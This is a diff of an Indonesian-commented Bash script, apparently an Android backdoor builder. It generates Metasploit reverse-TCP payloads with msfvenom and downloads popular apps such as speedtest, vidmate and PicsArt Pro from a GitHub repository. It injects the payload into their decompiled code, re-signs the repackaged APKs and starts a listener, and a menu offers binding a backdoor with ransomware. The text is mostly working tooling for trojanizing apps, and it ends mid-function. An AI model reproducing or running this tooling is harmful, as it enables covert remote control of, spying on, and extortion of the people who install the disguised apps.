+        printf "\033[37;1m[\033[32;1m*\033[37;1m] local ip address anda : $wlan0_ip (\033[31;1mwifi\033[37;1m)\033[31;1m\n"
         echo
         read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] masukan lhost  : "'\033[34;1m')" lh
         printf '\033[31;1m'
-        spiner
-        echo
         read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] masukan port   : "'\033[34;1m')" lp
         printf '\033[31;1m'
-        spiner
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] generate backdoor . . . please wait\033[31;1m\n"
-        spiner
-        echo
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Generate Backdoor . . . please wait\033[31;1m\n"
         sleep 2
 }
 
@@ -737,227 +666,144 @@ function sets_original(){
         baner
         printf '\033[31;1m'
         echo
-        spiner
-        echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] sekarang masukan ip untuk backdoor anda\033[31;1m\n"
-        spiner
-        echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] local ip address anda, eth0  (\033[31;1mlocal\033[37;1m)\033[31;1m\n"
-        spiner
-        echo
-        echo
-        ifconfig eth0|grep "inet"|awk 'NR == 1 {print $2}'
-        echo
-        spiner
-        printf "\033[37;1m\n[\033[32;1m*\033[37;1m] local ip address anda, wlan0 (\033[31;1mwifi\033[37;1m)\033[31;1m\n"
-        spiner
-        echo
-        echo
-        ifconfig wlan0|grep "inet"|awk 'NR == 1 {print $2}'
-        echo
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] ip Backdoor\033[31;1m\n"
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] local ip address anda : $eth0_ip  (\033[31;1mlocal\033[37;1m)\033[31;1m\n"
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] local ip address anda : $wlan0_ip (\033[31;1mwifi\033[37;1m)\033[31;1m\n"
         echo
         read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] masukan lhost  : "'\033[34;1m')" lh
         printf '\033[31;1m'
-        spiner
-        echo
         read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] masukan port   : "'\033[34;1m')" lp
         printf '\033[31;1m'
-        spiner
-        echo
-        read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] nama backdoor  : "'\033[34;1m')" nama
+        read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] nama Backdoor  : "'\033[34;1m')" nama
         printf '\033[31;1m'
-        spiner
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] generate backdoor . . . please wait\033[31;1m\n"
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Generate Backdoor . . . please wait\033[31;1m\n"
         printf '\033[31;1m'
-        spiner
         echo
         sleep 2
 }
 
-# fungsi listener untuk eksekusi backdoor
+# fungsi listener untuk eksekusi Backdoor
 function listener_kali(){
         clear
         baner
+        tun0_ip=$(ifconfig tun0|grep "inet"|awk 'NR == 1 {print $2}')
         printf '\033[31;1m'
         echo
-        spiner
-        echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] sekarang masukan ip listener anda\033[31;1m\n"
-        spiner
-        echo
-        sleep 0.025
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] local ip address anda, eth0  (\033[31;1mlocal\033[37;1m)\033[31;1m\n"
-        spiner
-        echo
-        echo
-        ifconfig eth0|grep "inet"|awk 'NR == 1 {print $2}'
-        echo
-        spiner
-        sleep 0.025
-        printf "\033[37;1m\n[\033[32;1m*\033[37;1m] local ip address anda, wlan0 (\033[31;1mwifi\033[37;1m)\033[31;1m\n"
-        spiner
-        echo
-        echo
-        sleep 0.025
-        ifconfig wlan0|grep "inet"|awk 'NR == 1 {print $2}'
-        echo
-        spiner
-        echo
-        sleep 0.025
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] forward ip address anda, tun0(\033[31;1mforward\033[37;1m)\n"
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] ip listener\033[31;1m\n"
+        sleep 0.025s
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] local ip address anda : $eth0_ip  (\033[31;1mlocal\033[37;1m)\033[31;1m\n"
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] local ip address anda : $wlan0_ip (\033[31;1mwifi\033[37;1m)\033[31;1m\n"
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] ip forward anda       : $tun0_ip (\033[31;1mforward\033[37;1m)\n"
         printf '\033[31;1m'
-        spiner
-        echo
-        echo
-        sleep 0.025
-        ifconfig tun0|grep "inet"|awk 'NR == 1 {print $2}'
-        echo
-        spiner
         echo
         sleep 0.025
         read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] masukan lhost  : "'\033[34;1m')" lh
         printf '\033[31;1m'
-        spiner
-        echo
         sleep 0.025
         read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] masukan port   : "'\033[34;1m')" lp
         printf '\033[31;1m'
-        spiner
-        echo
         sleep 0.025
+        echo
         printf "\033[37;1m[\033[32;1m*\033[37;1m] starting apache2 && database (\033[32;1mruning\033[37;1m)\n"
         printf '\033[31;1m'
-        spiner
-        echo
         sleep 0.025
         service apache2 start > /dev/null
         printf "\033[37;1m[\033[32;1m*\033[37;1m] apache server\033[31;1m [\033[32;1mOK\033[31;1m]\n"
-        spiner
-        echo
         sleep 0.025
         service postgresql start > /dev/null
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] postgresql\033[31;1m   [\033[32;1mOK\033[31;1m]\n"
-        spiner
         echo
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] postgresql\033[31;1m   [\033[32;1mOK\033[31;1m]\n"
         sleep 0.025
         printf "\033[37;1m[\033[32;1m*\033[37;1m] starting metasploit listener . . .\033[31;1m\n"
-        spiner
-        echo
         sleep 2
         clear
 }
 
-# sign backdoor file manual inject
+# sign Backdoor file manual inject
 #
 function sign_orig(){
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] memeriksa .android/key.keystore untuk penandatanganan\033[31;1m\n"
-        spiner
-        echo
-if [ ! -f .android/key.keystore ]; then
-        printf "\033[37;1m[\033[31;1mx\033[37;1m] Kunci debug tidak ditemukan. membuatnya sekarang\033[31;1m\n"
-        spiner
-        echo
-        if [ ! -d ".android"  ]; then
-        mkdir .android > /dev/null
-        fi
-        keytool -genkey -v -keystore .android/key.keystore -storepass android -alias key -keypass android -keyalg RSA -keysize 2048 -validity 10000
-fi
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] mencoba menandatangani paket dengan kunci android anda\033[31;1m\n"
-        spiner
-        echo
-        jarsigner -keystore .android/key.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA ori.apk key > /dev/null 2>&1
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] menandatangani aplikasi backdoor anda,\033[32;1m succesfully\033[31;1m\n"
-        spiner
-        echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] mencoba memverifikasi aplikasi backdoor anda, please wait\033[31;1m\n"
-        spiner
-        echo
-        jarsigner -verify -verbose -certs ori.apk.apk > /dev/null 2>&1
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] menyelaraskan aplikasi kom pilasi ulang\033[31;1m\n"
-        spiner
-        echo
+#        printf "\033[37;1m[\033[32;1m*\033[37;1m] memeriksa .android/key.keystore untuk penandatanganan\033[31;1m\n"
+#        echo
+#if [ ! -f $mypath/.android/sign.jar ]; then
+#        printf "\033[37;1m[\033[31;1mx\033[37;1m] Kunci debug tidak ditemukan. membuatnya sekarang\033[31;1m\n"
+#        echo
+#        if [ ! -d ".android"  ]; then
+#        mkdir .android > /dev/null
+#        fi
+#        keytool -genkey -v -keystore .android/key.keystore -storepass android -alias key -keypass android -keyalg RSA -keysize 2048 -validity 10000
+#fi
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] sign your backdoor\033[31;1m\n"
+        java -jar $path/Malware/.android/sign.jar ori.apk;mv ori.s.apk ori.apk > /dev/null 2>&1
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] signed backdoor,\033[32;1m succesfully\033[31;1m\n"
+        sleep 0.025s
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] verification your backdoor, please wait\033[31;1m\n"
+        sleep 0.025s
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] recompyle your backdoor\033[31;1m\n"
+        sleep 0.025s
         zipalign 4 ori.apk $nama.apk > /dev/null 2>&1
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] verifikasi aplikasi backdoor anda,\033[32;1m succesfully\033[31;1m\n"
-        spiner
-
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] verification, \033[32;1m succesfully\033[31;1m\n"
+        sleep 3
 }
 
-# sign backdoor
+# sign Backdoor
 #
-function sign(){
-	echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] memeriksa .android/key.keystore untuk penandatanganan\033[31;1m\n"
-        spiner
-        echo
-if [ ! -f .android/key.keystore ]; then
-        printf "\033[37;1m[\033[31;1mx\033[37;1m] Kunci debug tidak ditemukan. membuatnya sekarang\033[31;1m\n"
-        spiner
-        echo
-        if [ ! -d ".android"  ]; then
-        mkdir .android > /dev/null 2>&1
-        fi
-        keytool -genkey -v -keystore .android/key.keystore -storepass android -alias key -keypass android -keyalg RSA -keysize 2048 -validity 10000
-fi
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] mencoba menandatangani paket dengan kunci android anda\033[31;1m\n"
-        spiner
-        echo
-        jarsigner -keystore .android/key.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA malware.apk key > /dev/null 2>&1
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] menandatangani aplikasi backdoor anda,\033[32;1m succesfully\033[31;1m\n"
-        spiner
-        echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] mencoba memverifikasi aplikasi backdoor anda, please wait\033[31;1m\n"
-        spiner
-        echo
-        jarsigner -verify -verbose -certs malware.apk > /dev/null 2>&1
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] verifikasi aplikasi backdoor anda,\033[32;1m succesfully\033[31;1m\n"
-        spiner
-        echo
+function sign(){        
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] sign your backdoor\033[31;1m\n"
+        java -jar $path/Malware/.android/sign.jar malware.apk;mv malware.s.apk malware.apk > /dev/null 2>&1
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] signed backdoor,\033[32;1m succesfully\033[31;1m\n"
+        sleep 0.025s
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] verification your backdoor, please wait\033[31;1m\n"
+        sleep 0.025s
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] recompyle your backdoor\033[31;1m\n"
+        sleep 0.025s
+        zipalign 4 malware.apk $nama.apk > /dev/null 2>&1
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] verification, \033[32;1m succesfully\033[31;1m\n"
+        sleep 3
 
 }
 
 rename(){
-read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] masukan nama backdoor : "'\033[34;1m')" new
+read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] nama backdoor : "'\033[34;1m')" new
 printf '\033[31;1m'
-spiner
+
 echo
 cd $path/Malware && mv malware.apk $new.apk
-printf "\033[31;1m[\033[32;1m✔\033[31;1m]\033[37;1m nama backdoor berhasil dibuat menjadi ~>\033[31;1m $new\n"
-spiner
+printf "\033[31;1m[\033[32;1m✔\033[31;1m]\033[37;1m nama backdoor berhasil diubah menjadi ~>\033[31;1m $new\n"
+
 }
 
 function android(){
 	clear
 	baner
 	echo
-        printf "\033[31;1m[\033[32;1m1\033[31;1m]\033[37;1m Backdoor Android\n"
+        printf "\033[31;1m\t[\033[32;1m1\033[31;1m]\033[37;1m Backdoor Android\n"
         sleep 0.025
-        printf "\033[31;1m[\033[32;1m2\033[31;1m]\033[37;1m Bind Backdoor original from template\033[31;1m\n"
+        printf "\033[31;1m\t[\033[32;1m2\033[31;1m]\033[37;1m Bind Backdoor original from template\033[31;1m\n"
         sleep 0.025
-        printf "\033[31;1m[\033[32;1m3\033[31;1m]\033[37;1m Bind Backdoor original from file\033[31;1m [\033[32;1mBETA\033[31;1m]\n"
+        printf "\033[31;1m\t[\033[32;1m3\033[31;1m]\033[37;1m Bind Backdoor original from file\n"
         sleep 0.025
-				printf "\033[31;1m[\033[32;1m4\033[31;1m]\033[37;1m Bind Backdoor + inject ransomware\033[31;1m [\033[32;1mBETA\033[31;1m]\n"
+	printf "\033[31;1m\t[\033[32;1m4\033[31;1m]\033[37;1m Bind Backdoor + inject ransomware\n"
         sleep 0.025
-        printf "\033[31;1m[\033[32;1m0\033[31;1m]\033[37;1m kembali\n\n"
-        read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
+        printf "\033[31;1m\t[\033[32;1m0\033[31;1m]\033[37;1m kembali\n\n"
+        read -p "$(printf "\033[31;1m\t[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
         sleep 0.025
         echo
         	if [ $xyz = "1"  ];
         	then
-        	backdoor
+        	Backdoor
 
         	elif [ $xyz = "2"  ];
         	then
-        	backdoor_template
+        	Backdoor_template
 
         	elif [ $xyz = "3"  ];
         	then
-        	backdoor_file
+        	Backdoor_file
 
-					elif [ $xyz = "4"  ];
-					then
-					backdoor_ransomware
+                elif [ $xyz = "4"  ];
+                then
+                Backdoor_ransomware
 
 		elif [ $xyz = "0"  ];
 		then
@@ -971,57 +817,57 @@ function android(){
 		fi
 }
 
-# fungsi android user input backdoor android
+# fungsi android user input Backdoor android
 #
-function backdoor(){
+function Backdoor(){
 # fungsi user xyz 1
                 sets
                 sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -a dalvik --platform android --arch dalvik -o $path/Malware/malware.apk | awk 'NR == 9 {print $0}' > /dev/null 2>&1
                 printf '\033[31;1m'
-                spiner
+                
                 echo
-                printf "\033[37;1m[\033[32;1m*\033[37;1m] generate backdoor . . .\033[32;1m succesfully\033[31;1m\033[31;1m\n"
+                printf "\033[37;1m[\033[32;1m*\033[37;1m] Generate Backdoor . . .\033[32;1m succesfully\033[31;1m\033[31;1m\n"
                 printf '\033[31;1m'
-                spiner
+                
                 echo
                 sleep 2
                 rename
                 sign
 }
 
-#fungsi android user input backdoor template
+#fungsi android user input Backdoor template
 #
-function backdoor_template(){
+function Backdoor_template(){
 printf '\033[31;1m'
-printf "\033[31;1m[\033[32;1m01\033[31;1m]\033[37;1m spyphone\033[31;1m\n"
+printf "\033[31;1m\t[\033[32;1m01\033[31;1m]\033[37;1m spyphone\033[31;1m\n"
 sleep 0.025
-printf "\033[31;1m[\033[32;1m02\033[31;1m]\033[37;1m speedtest\033[31;1m\n"
+printf "\033[31;1m\t[\033[32;1m02\033[31;1m]\033[37;1m speedtest\033[31;1m\n"
 sleep 0.025
-printf "\033[31;1m[\033[32;1m03\033[31;1m]\033[37;1m vidmate\033[31;1m\n"
+printf "\033[31;1m\t[\033[32;1m03\033[31;1m]\033[37;1m vidmate\033[31;1m\n"
 sleep 0.025
-printf "\033[31;1m[\033[32;1m04\033[31;1m]\033[37;1m wifi wps\033[31;1m\n"
+printf "\033[31;1m\t[\033[32;1m04\033[31;1m]\033[37;1m wifi wps\033[31;1m\n"
 sleep 0.025
-printf "\033[31;1m[\033[32;1m05\033[31;1m]\033[37;1m uc mini\033[31;1m\n"
+printf "\033[31;1m\t[\033[32;1m05\033[31;1m]\033[37;1m uc mini\033[31;1m\n"
 sleep 0.025
-printf "\033[31;1m[\033[32;1m06\033[31;1m]\033[37;1m keyboard\033[31;1m\n"
+printf "\033[31;1m\t[\033[32;1m06\033[31;1m]\033[37;1m keyboard\033[31;1m\n"
 sleep 0.025
-printf "\033[31;1m[\033[32;1m07\033[31;1m]\033[37;1m g45\033[31;1m\n"
+printf "\033[31;1m\t[\033[32;1m07\033[31;1m]\033[37;1m g45\033[31;1m\n"
 sleep 0.025
-printf "\033[31;1m[\033[32;1m08\033[31;1m]\033[37;1m Design\033[31;1m\n"
+printf "\033[31;1m\t[\033[32;1m08\033[31;1m]\033[37;1m Design\033[31;1m\n"
 sleep 0.025
-printf "\033[31;1m[\033[32;1m09\033[31;1m]\033[37;1m Droidsql\033[31;1m\n"
+printf "\033[31;1m\t[\033[32;1m09\033[31;1m]\033[37;1m Droidsql\033[31;1m\n"
 sleep 0.025
-printf "\033[31;1m[\033[32;1m10\033[31;1m]\033[37;1m ave play\033[31;1m\n"
+printf "\033[31;1m\t[\033[32;1m10\033[31;1m]\033[37;1m ave play\033[31;1m\n"
 sleep 0.025
-printf "\033[31;1m[\033[32;1m11\033[31;1m]\033[37;1m indoxxi\033[31;1m\n"
+printf "\033[31;1m\t[\033[32;1m11\033[31;1m]\033[37;1m indoxxi\033[31;1m\n"
 sleep 0.025
-printf "\033[31;1m[\033[32;1m12\033[31;1m]\033[37;1m picsart pro\033[31;1m\n"
+printf "\033[31;1m\t[\033[32;1m12\033[31;1m]\033[37;1m picsart pro\033[31;1m\n"
 sleep 0.025
-printf "\033[31;1m[\033[32;1m00\033[31;1m]\033[37;1m kembali\033[31;1m\n"
+printf "\033[31;1m\t[\033[32;1m00\033[31;1m]\033[37;1m kembali\033[31;1m\n"
 sleep 0.025
-printf "\033[31;1m[\033[32;1m**\033[31;1m]\n"
+printf "\033[31;1m\t[\033[32;1m**\033[31;1m]\n"
 sleep 0.025
-read -p "$(printf "\033[31;1m[\033[32;1m**\033[31;1m] choice : "'\033[34;1m')" xyz
+read -p "$(printf "\033[31;1m\t[\033[32;1m**\033[31;1m] choice : "'\033[34;1m')" xyz
 sleep 0.025
 echo
 clear
@@ -1029,73 +875,73 @@ clear
 	then
 	spyphone
 	sign
-	rename_backdoor
+	rename_Backdoor
 
 	elif [ $xyz = "2" ] || [ $xyz = "02"  ];
 	then
 	speedtest
 	sign
-	rename_backdoor
+	rename_Backdoor
 
 	elif [ $xyz = "3" ] || [ $xyz = "03"  ];
 	then
 	vidmate
 	sign
-	rename_backdoor
+	rename_Backdoor
 
 	elif [ $xyz = "4" ] || [ $xyz = "04"  ];
 	then
 	wifiwps
 	sign
-	rename_backdoor
+	rename_Backdoor
 
 	elif [ $xyz = "5" ] || [ $xyz = "05"  ];
 	then
 	uc
 	sign
-	rename_backdoor
+	rename_Backdoor
 
 	elif [ $xyz = "6" ] || [ $xyz = "06"  ];
 	then
 	keyboard
 	sign
-	rename_backdoor
+	rename_Backdoor
 
 	elif [ $xyz = "7" ] || [ $xyz = "07"  ];
 	then
 	g45
 	sign
-	rename_backdoor
+	rename_Backdoor
 
 	elif [ $xyz = "8" ] || [ $xyz = "08"  ];
 	then
 	design
 	sign
-	rename_backdoor
+	rename_Backdoor
 
 	elif [ $xyz = "9" ] || [ $xyz = "09"  ];
 	then
 	droidsql
 	sign
-	rename_backdoor
+	rename_Backdoor
 
 	elif [ $xyz = "10" ] || [ $xyz = "10"  ];
 	then
 	ave
 	sign
-	rename_backdoor
+	rename_Backdoor
 
 	elif [ $xyz = "11" ] || [ $xyz = "11"  ];
 	then
 	indoxxi
 	sign
-	rename_backdoor
+	rename_Backdoor
 
 	elif [ $xyz = "12" ] || [ $xyz = "12"  ];
 	then
 	picsart
 	sign
-	rename_backdoor
+	rename_Backdoor
 
 	elif [ $xyz = "0" ] || [ $xyz = "00"  ];
 	then
@@ -1105,641 +951,639 @@ clear
 	printf "\033[31;1m[\033[37;1m!\033[31;1m]\033[37;1m masukan input dengan benar . .\n"
 	sleep 2
 	printf '\033[31;1m'
-	backdoor_template
+	Backdoor_template
 
 	fi
 
 }
 
-# backdoor spyphone
+# Backdoor spyphone
 #
 function spyphone(){
         $fixjava
         sets
         sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -a dalvik --platform android --arch dalvik -o $path/Malware/payload.apk | awk 'NR == 9 {print $0}' > /dev/null 2>&1
         printf '\033[31;1m'
-        spiner
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] generate backdoor . . .\033[32;1m succesfully\033[31;1m\033[31;1m\n"
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Generate Backdoor . . .\033[32;1m succesfully\033[31;1m\033[31;1m\n"
         printf '\033[31;1m'
-        spiner
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] download spyphone from template\033[31;1m\n"
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Download spyphone from template\033[31;1m\n"
         printf '\033[31;1m'
-        spiner
+
         echo
         cd $path/Malware
         wget https://github.com/K1M4K-ID/malware/blob/main/spyphone.apk?raw=true > /dev/null 2>&1
         mv spyphone.apk?raw=true spyphone.apk > /dev/null
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] download\033[32;1m succesfully\033[31;1m\n"
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Download\033[32;1m succesfully\033[31;1m\n"
         printf '\033[31;1m'
-        spiner
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] decompyle payload please wait\033[31;1m\n"
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Decompyle payload please wait\033[31;1m\n"
         printf '\033[31;1m'
-        spiner
+
         echo
         cd $path/Malware
         _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
         sudo apktool d payload.apk
-        spiner
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] decompyle spyphone please wait\033[31;1m\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Decompyle spyphone please wait\033[31;1m\033[31;1m\n"
+
         echo
         cd $path/Malware
         _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
         sudo apktool d spyphone.apk
-        spiner
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] recompyle spyphone please wait\033[31;1m\033[31;1m\n"
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Recompyle spyphone please wait\033[31;1m\033[31;1m\n"
         cd $path/Malware
         rm -fr spyphone/smali/com/metasploit/stage && cp -r payload/smali/com/metasploit spyphone/smali/com/metasploit
-        spiner
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] rebuild spyphone please wait\033[31;1m\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Rebuild spyphone please wait\033[31;1m\033[31;1m\n"
+
         echo
         cd $path/Malware
         _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
         sudo apktool b spyphone -o malware.apk
         rm -fr spyphone.apk spyphone payload payload.apk
-        spiner
+
 }
 
-# fungsi backdoor speedtest
+# fungsi Backdoor speedtest
 #
 function speedtest(){
         $fixjava
         sets
         sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -a dalvik --platform android --arch dalvik -o $path/Malware/payload.apk | awk 'NR == 9 {print $0}' > /dev/null 2>&1
-        spiner
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] generate backdoor . . .\033[32;1m succesfully\033[31;1m\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Generate Backdoor . . .\033[32;1m succesfully\033[31;1m\033[31;1m\n"
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] download speedtest from template\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Download speedtest from template\033[31;1m\n"
+
         echo
         cd $path/Malware
         wget https://github.com/K1M4K-ID/malware/blob/main/speedtest.apk?raw=true > /dev/null 2>&1
         mv speedtest.apk?raw=true speedtest.apk > /dev/null
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] download\033[32;1m succesfully\033[31;1m\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Download\033[32;1m succesfully\033[31;1m\033[31;1m\n"
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] decompyle payload please wait\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Decompyle payload please wait\033[31;1m\n"
+
         echo
         cd $path/Malware
         _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
         sudo apktool d payload.apk
-        spiner
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] decompyle speedtest please wait\033[31;1m\n"
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Decompyle speedtest please wait\033[31;1m\n"
         cd $path/Malware
-        spiner
+
         echo
         _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
         sudo apktool d speedtest.apk
-        spiner
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] recompyle speedtest please wait\033[31;1m\n"
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Recompyle speedtest please wait\033[31;1m\n"
         cd $path/Malware
         rm -fr speedtest/smali/com/metasploit/stage && cp -r payload/smali/com/metasploit speedtest/smali/com/metasploit
-        spiner
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] rebuild speedtest please wait\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Rebuild speedtest please wait\033[31;1m\n"
+
         echo
         cd $path/Malware
         _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
         sudo apktool b speedtest -o malware.apk
         rm -fr speedtest.apk speedtest payload payload.apk
-        spiner
+
 }
 
-# fungsi backdoor vidmate
+# fungsi Backdoor vidmate
 #
 function vidmate(){
         $fixjava
         sets
         sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -a dalvik --platform android --arch dalvik -o $path/Malware/payload.apk | awk 'NR == 9 {print $0}' > /dev/null 2>&1
-        spiner
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] generate backdoor . . .\033[32;1m succesfully\033[31;1m\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Generate Backdoor . . .\033[32;1m succesfully\033[31;1m\033[31;1m\n"
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] download vidmate from template\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Download vidmate from template\033[31;1m\n"
+
         echo
         cd $path/Malware
         wget https://github.com/K1M4K-ID/malware/blob/main/vidmate.apk?raw=true > /dev/null 2>&1
         mv vidmate.apk?raw=true vidmate.apk > /dev/null
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] download\033[32;1m succesfully\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Download\033[32;1m succesfully\033[31;1m\n"
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] decompyle payload please wait\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Decompyle payload please wait\033[31;1m\n"
+
         echo
         cd $path/Malware
         _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
         sudo apktool d payload.apk
-        spiner
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] decompyle vidmate please wait\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Decompyle vidmate please wait\033[31;1m\n"
+
         echo
         cd $path/Malware
         _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
         sudo apktool d vidmate.apk
-        spiner
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] recompyle vidmate please wait\033[31;1m\n"
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Recompyle vidmate please wait\033[31;1m\n"
         cd $path/Malware
         rm -fr vidmate/smali/com/metasploit/stage && cp -r payload/smali/com/metasploit vidmate/smali/com/metasploit
-        spiner
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] rebuild vidmate please wait\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Rebuild vidmate please wait\033[31;1m\n"
+
         echo
         cd $path/Malware
         _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
         sudo apktool b vidmate -o malware.apk
         rm -fr vidmate.apk vidmate payload payload.apk
-        spiner
+
 }
 
-# fungsi backdoor wifi wps
+# fungsi Backdoor wifi wps
 #
 function wifiwps(){
         $fixjava
         sets
         sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -a dalvik --platform android --arch dalvik -o $path/Malware/payload.apk | awk 'NR == 9 {print $0}' > /dev/null 2>&1
-        spiner
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] generate backdoor . . .\033[32;1m succesfully\033[31;1m\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Generate Backdoor . . .\033[32;1m succesfully\033[31;1m\033[31;1m\n"
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] download wifi wps from template\033[31;1m\n"
-        spiner
